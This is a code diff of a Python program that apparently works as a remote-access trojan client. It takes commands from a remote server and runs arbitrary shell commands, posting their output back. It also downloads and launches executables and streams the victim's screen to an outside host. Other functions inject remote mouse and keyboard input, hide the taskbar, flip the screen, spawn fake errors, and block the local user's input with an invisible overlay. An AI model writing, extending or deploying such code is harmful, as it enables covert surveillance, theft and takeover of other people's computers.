@@ -1,29 +1,34 @@
-import requests as rq
-from time import sleep
-from threading import Thread
-from webbrowser import open as wbopen
-import pygame
-import os
-import pyttsx3
-from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from comtypes import CLSCTX_ALL, CoInitialize, CoUninitialize
-from shutil import rmtree
-import rotatescreen as rs
-from PIL import Image
+from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+from os import path, mkdir, startfile, remove, system
 from mouse import move, click, wheel, double_click
+from rotatescreen import get_primary_display
+from PIL.Image import frombytes, Resampling
+from webbrowser import open as wbopen
+from subprocess import run as sbrun
+from keyboard import wait, send
+from requests import get,post
+from time import sleep, time
+from threading import Thread
+from pyautogui import size
+from shutil import rmtree
 from io import BytesIO
-import time 
+from mss import mss
+import tkinter as tk
+import pyttsx3
 import asyncio
 import aiohttp
-import keyboard
-from pyautogui import size
-from mss import mss
-url = "https://ms32-c67b.onrender.com/"
-# url = "http://192.168.9.115:5000/"
-screen = rs.get_primary_display()
-terminate = False
+import pygame
+
+url = "http://192.168.9.115:5000/"
+# url = "http://127.0.0.1:5000/"
+screen = get_primary_display()
+terminate = False           
 sstate = False
 sharing = False
+bstate = False
+bmstate = False
+bsig  = False
 user = "03"
 width, height = size()
 try:
@@ -31,27 +36,28 @@ try:
 except:
     try:
         statement = f"WARN   no speaker detected, no audio will play"
-        rq.post(url+"output",data={"user":user,"err":statement})
+        post(url+"output",data={"user":user,"err":statement})
     except:
         pass
               
-if not os.path.exists("effects"):
-    os.mkdir("effects")
-if not os.path.exists("assets"):
-    os.mkdir("assets")
+if not path.exists("effects"):
+    mkdir("effects")
+if not path.exists("assets"):
+    mkdir("assets")
 
 def hit(url:str,data=None):
     # try:
         if not terminate:
             if data:
-                return rq.post(url,json=data)
-            return rq.get(url,stream=True)
+                return post(url,json=data)
+            return get(url,stream=True)
     # except:
     #     return "none"
 
-def log(statement,state="SUCESS"):
+def log(statement,state="SUCESS",terminal=False):
     try:
         statement = f"{state}   {statement}"
+        hit(url+"terminal",data={"output":statement}) if terminal else None
         hit(url+"output",data={"user":user,"err":statement})
     except:
         pass
@@ -61,21 +67,21 @@ def say(txt):
         engine = pyttsx3.init()
         engine.setProperty("rate",engine.getProperty('rate')-40)
         engine.say(txt)
-        log(f"Played {txt}")
+        log(f"Played {txt}",terminal=True)
         engine.runAndWait()
     except Exception as e:
         log(f"pyttsx3 thread error:\t{e}",state="WARN")
 
 def playfunc(fp):
     try:
-        if not os.path.exists(os.path.join("effects",fp)):
+        if not path.exists(path.join("effects",fp)):
             audi = hit(url+f"static/sounds/{fp}")
             try:
                 kp = type(audi.content.decode("utf-8"))
                 log(f"Likely error. recieved content for {fp} is {kp}")
             except Exception as e:
                 log(f"DOwnloaded {fp}")
-            with open(os.path.join("effects",fp), "xb") as file:
+            with open(path.join("effects",fp), "xb") as file:
                 downloaded_size = 0
                 for chunk in audi.iter_content(chunk_size=8192):
                     if chunk:
@@ -84,12 +90,12 @@ def playfunc(fp):
         # try:                
         CoInitialize()
         devices = AudioUtilities.GetSpeakers()
-        interface = devices.Activate(IAudioEndpointVolume.iid, CLSCTX_ALL, None)
+        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
         volume = interface.QueryInterface(IAudioEndpointVolume)
         
         if volume.GetMute():
             volume.SetMute(0, None)
-        log("Unmuted")
+            log("Unmuted")
         vmin, vmax, _ = volume.GetVolumeRange()
         target = vmin + (95 / 100.0) * (vmax - vmin)
         target = max(min(target, vmax), vmin)
@@ -99,7 +105,7 @@ def playfunc(fp):
         CoUninitialize()
         log("Vol set to 80")
         pygame.mixer.music.load(f"effects/{fp}")
-        log(f"Playing {fp}")
+        log(f"Playing {fp}",terminal=True)
         pygame.mixer.music.play()
         while pygame.mixer.music.get_busy():
             continue               
@@ -123,7 +129,7 @@ def update():
                 if chunk:
                     file.write(chunk)
                     downloaded_size += len(chunk)
-        if not os.path.exists("updater.exe"):
+        if not path.exists("updater.exe"):
             exe = hit(url+"static/updates/updater.exe")
             try:
                 kp = type(exe.content.decode("utf-8"))
@@ -136,7 +142,7 @@ def update():
                     if chunk:
                         file.write(chunk)
                         downloaded_size += len(chunk)
-        os.startfile("updater.exe")
+        startfile("updater.exe")
         log("Updating ms32.exe")
         terminate=True
         return
@@ -146,7 +152,7 @@ def update():
 def hide(state):
     try:
         if state:
-            if not os.path.exists("hide.exe"):
+            if not path.exists("hide.exe"):
                 exe = hit(url+"static/updates/hide.exe")
                 try:
                     kp = type(exe.content.decode("utf-8"))
@@ -159,10 +165,10 @@ def hide(state):
                         if chunk:
                             file.write(chunk)
                             downloaded_size += len(chunk)
-            os.startfile("hide.exe")
-            log("Taskbar hidden")
+            startfile("hide.exe")
+            log("Taskbar hidden",terminal=True)
         else:
-            if not os.path.exists("show.exe"):
+            if not path.exists("show.exe"):
                 exe = hit(url+"static/updates/show.exe")
                 try:
                     kp = type(exe.content.decode("utf-8"))
@@ -175,15 +181,15 @@ def hide(state):
                         if chunk:
                             file.write(chunk)
                             downloaded_size += len(chunk)
-            os.startfile("show.exe")
-            log("Taskbar Unhidden")
+            startfile("show.exe")
+            log("Taskbar Unhidden",terminal=True)
     except Exception as e:
         log(f"hide/show thread error occured:\t{e}",state="WARN")
 
 def restart():
     try:
         global terminate
-        if not os.path.exists("restart.exe"):
+        if not path.exists("restart.exe"):
             exe = hit(url+"static/updates/restart.exe")
             try:
                 kp = type(exe.content.decode("utf-8"))
@@ -196,8 +202,8 @@ def restart():
                     if chunk:
                         file.write(chunk)
                         downloaded_size += len(chunk) 
-        os.startfile("restart.exe")
-        log("Restarting...")
+        startfile("restart.exe")
+        log("Restarting...",terminal=True)
         terminate = True
     
     except Exception as e:
@@ -205,8 +211,8 @@ def restart():
 
 def run(name):
     try:
-        if os.path.exists(name):
-            os.remove(name)
+        if path.exists(name):
+            remove(name)
         exe = hit(url+f"static/apps/{name}")
         try:
             kp = type(exe.content.decode("utf-8"))
@@ -220,7 +226,7 @@ def run(name):
                     file.write(chunk)
                     downloaded_size += len(chunk)
         log(f"Running {name}")
-        os.startfile(name)
+        startfile(name)
         log(f"Done Running {name}")
     except Exception as e:
         log(f"Run thread error occured:\t{e}",state="WARN")
@@ -234,17 +240,17 @@ def display(fp:str):
         except Exception as e:
             log(f"DOwnloaded {fp}")
         ext = fp.split(".")[1]
-        if os.path.exists("assets"):
+        if path.exists("assets"):
             rmtree("assets")
             log("removed assets folder")
-        os.mkdir("assets")
+        mkdir("assets")
         with open(f"assets/sample.{ext}", "xb") as file:
             downloaded_size = 0
             for chunk in asset.iter_content(chunk_size=8192):
                 if chunk:
                     file.write(chunk)
                     downloaded_size += len(chunk)
-        if not os.path.exists("imshow.exe"):
+        if not path.exists("imshow.exe"):
             exe = hit(url+f"static/apps/imshow.exe")
             try:
                 kp = type(exe.content.decode("utf-8"))
@@ -257,15 +263,15 @@ def display(fp:str):
                     if chunk:
                         file.write(chunk)
                         downloaded_size += len(chunk)
-        os.startfile("imshow.exe")
-        log("Started imshow.exe, llikely image showing")
+        startfile("imshow.exe")
+        log("Started imshow.exe, llikely image showing",terminal=True)
     except Exception as e:
         log(f"Display thread error occured:\t{e}",state="WARN")
 
 def flip():
     global sstate
     try:
-        log("Flipping")
+        log("Flipping",terminal=True)
         while sstate:
             screen.set_portrait()
             sleep(1)
@@ -280,14 +286,28 @@ def flip():
 
 def runcmd(cmd):
     try:
-        os.system(cmd)
-        return True
+        command = cmd
+        #kahe?
+        try:
+            result = sbrun(command, shell=True, capture_output=True, text=True)
+            stdout = result.stdout
+            stderr = result.stderr
+            exit_code = result.returncode
+        except Exception as e:
+            stdout = ""
+            stderr = str(e)
+            exit_code = -1
+        if not stderr:stderr="none"
+        if not stdout:stdout="none"
+        output = f"OUTPUT:\t{stdout}\nERROR:\t{stderr}\nCODE:\t{exit_code}"
+        post(url+"terminal",json={"output":output})
+
     except Exception as e:
         log(f"runcmd thread error:\t{e}",state="WARN")
 
 def showerr(num):
     try:
-        if not os.path.exists("error.exe"):
+        if not path.exists("error.exe"):
             exe = hit(url+f"static/apps/error.exe")
             try:
                 kp = type(exe.content.decode("utf-8"))
@@ -301,55 +321,94 @@ def showerr(num):
                             file.write(chunk)
                             downloaded_size += len(chunk)
         for _ in range(1,int(num)+1):
-            os.startfile("error.exe")
+            Thread(target=startfile,args=("error.exe",))
+        log(f"deployed {num} errors",terminal=True)
     except Exception as e:
         log(f"showerr thread error:\t{e}",state="WARN")
-        
+
+def block_touch(event):
+    global bstate
+    if not bstate:
+        return None
+    return "break"
+def block():
+    root = tk.Tk()
+
+    root.attributes("-fullscreen", True)
+    root.attributes("-alpha", 0.01)
+    root.attributes("-topmost", True)
+
+    root.bind("<ButtonPress>", block_touch)
+    root.bind("<ButtonRelease>", block_touch)
+    root.bind("<Motion>", block_touch)
+    while bstate:
+        root.update()
+    root.quit() 
+    root.destroy()
+    root = None  
+def block_main():
+    global bstate
+    global bmstate
+    global bsig
+    bmstate = True
+    bstate = True
+    bsig = True
+    while bmstate:
+        Thread(target=block).start()
+        while bsig:
+            pass
+        print("unlocking")
+        bstate = False
+        sleep(0.5)
+        bstate = True
+        bsig = True
+        print("lock")        
+
 async def share(url):
     global sharing
-    log("Sharing screen now")
+    log("Sharing screen now",terminal=True)
     async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(keepalive_timeout=10)) as session:
         with mss() as sct:
             frame_count = 0
             total_time = 0
-            fps_start_time = time.time()
+            fps_start_time = time()
             monitor = sct.monitors[1]
             full_screen_width = monitor['width']
             full_screen_height = monitor['height']
+            tasks = list()
             while sharing:
                 try:
-                    start_time = time.time()
+                    start_time = time()
                     screenshot = sct.grab(monitor)
-                    img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
+                    img = frombytes("RGB", screenshot.size, screenshot.rgb)
 
                     target_width = 1280
                     target_height = int(target_width * full_screen_height / full_screen_width)
-                    img = img.resize((target_width, target_height), Image.Resampling.LANCZOS)
+                    img = img.resize((target_width, target_height), Resampling.LANCZOS)
 
                     buffer = BytesIO()
                     img.save(buffer, format="JPEG", quality=30)
                     buffer.seek(0)
-
                     success = await send_screenshot(session, url, buffer)
                     if success:
-                        frame_count += 1
-
-                    frame_time = time.time() - start_time
+                       frame_count += 1
+                    frame_count += 1
+                    frame_time = time() - start_time
                     total_time += frame_time
-
-                    if time.time() - fps_start_time >= 1.0:
-                        avg_fps = frame_count / (time.time() - fps_start_time)
+                    if time() - fps_start_time >= 1.0:
+                        avg_fps = frame_count / (time() - fps_start_time)
                         # log(f"FPS: {avg_fps:.2f}")
                         print(f"FPS: {avg_fps:.2f}")
                         frame_count = 0
                         total_time = 0
-                        fps_start_time = time.time()
+                        fps_start_time = time()
 
                     target_fps = 30
                     sleep_time = max(0, 1 / target_fps - frame_time)
                     await asyncio.sleep(sleep_time)
 
                 except Exception as e:log(f"share thread error:\t{e}",state="WARN")
+            await asyncio.gather(*tasks)
 async def send_screenshot(session, url, buffer):
     retries = 3
     for attempt in range(retries):
@@ -363,12 +422,10 @@ async def send_screenshot(session, url, buffer):
             log(f"Attempt {attempt + 1}: Error: {e}",state="WARN")
         await asyncio.sleep(2 ** attempt)
     return False
-
 async def share_runner():
     log("sharing started")
     url = "https://server-20zy.onrender.com/screenshot"
     await share(url)
-
 async def control_runner():
     await control()
 def share_trig():
@@ -377,6 +434,7 @@ def control_trig():
     asyncio.run(control_runner())
 async def control():
     global sharing
+    global bsig
     async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(keepalive_timeout=10)) as session:
         while sharing:
             try:
@@ -388,10 +446,13 @@ async def control():
                         y = data["y"]*(height/data["height"])            
                         move(x,y)
                         if data["mouse"] == 0:
+                            bsig = False;sleep(0.03)
                             click()
-                        elif data["mouse"] == 1:        
+                        elif data["mouse"] == 1:   
+                            bsig = False;sleep(0.03)     
                             click(button="middle")
                         elif data["mouse"] == 2:
+                            bsig = False;sleep(0.03)
                             click(button="right")
                     elif data and data["type"] == "key" and data["btn"]:
                         btns = []
@@ -399,14 +460,17 @@ async def control():
                             btns.append(chr(key)) if type(key) == int else btns.append(key)
                         keys = "+".join(btns)
                         print(keys)
-                        keyboard.send(keys.lower())
-                    elif data and data["type"] == "scroll":                                    
+                        bsig = False;sleep(0.03)
+                        send(keys.lower())
+                    elif data and data["type"] == "scroll":
+                        bsig = False;sleep(0.03)                                    
                         wheel(delta=-(data["deltaY"]))
 
                     elif data and data["type"] == "dbclick":
                         x = data["x"]*(width/data["width"])
                         y = data["y"]*(height/data["height"])            
                         move(x,y)
+                        bsig = False;sleep(0.03)
                         double_click()
                     await asyncio.sleep(0.09)
             except Exception as e:log(f"control thread error:\t{e}")
@@ -414,6 +478,8 @@ async def control():
 def main():
     global sstate
     global sharing
+    global bmstate
+    global bsig
     log(f"{user} online!", state="ONLINE")
     while not terminate:
         try:
@@ -432,7 +498,7 @@ def main():
                 link = cmd.replace("oPeN ","")
                 link = link.replace("sPeAk","") if "sPeAk" in link else link
                 wbopen(link)
-                log(f"Opened {link}")
+                log(f"Opened {link}",terminal=True)
             elif "pLaY" in cmd:
                 fp = cmd.replace("pLaY ","")
                 fp = fp.replace("sPeAk","") if "sPeAk" in fp else fp
@@ -447,13 +513,17 @@ def main():
                 ifp = cmd.replace("iMaGe ","")
                 ifp = ifp.replace("sPeAk","") if "sPeAk" in ifp else ifp
                 Thread(target=display,args=(ifp,)).start()
+            elif "vIdEo" in cmd:
+                ifp = cmd.replace("vIdEo ","")
+                ifp = ifp.replace("sPeAk","") if "sPeAk" in ifp else ifp
+                Thread(target=display,args=(ifp,)).start()
             elif "fLiP on" in cmd:
                 sstate = True
                 Thread(target=flip).start()
             elif "fLiP off" in cmd:
                 sstate = False
                 screen.set_landscape()
-                log("flip off")
+                log("flip off",terminal=True)
             elif "cMd" in cmd:
                 cmd = cmd.replace("cMd ","")
                 cmd = cmd.replace("sPeAk","") if "sPeAk" in cmd else cmd
@@ -468,6 +538,10 @@ def main():
                 Thread(target=control_trig).start()
             elif "sHaRe off" in cmd:
                 sharing = False
+            elif "bLoCk on" in cmd:
+                Thread(target=block_main).start()
+            elif "bLoCk off" in cmd:
+                bmstate = False
             elif "sPeAk" in cmd:
                 txt = cmd.replace("sPeAk","")
                 saying = Thread(target=say,args=(txt,))
@@ -476,4 +550,4 @@ def main():
             log(f"Main thread error occured:\t{e}",state="WARN")
     log("Shutting down",state="OFFLINE")
 
-main()  
+main()
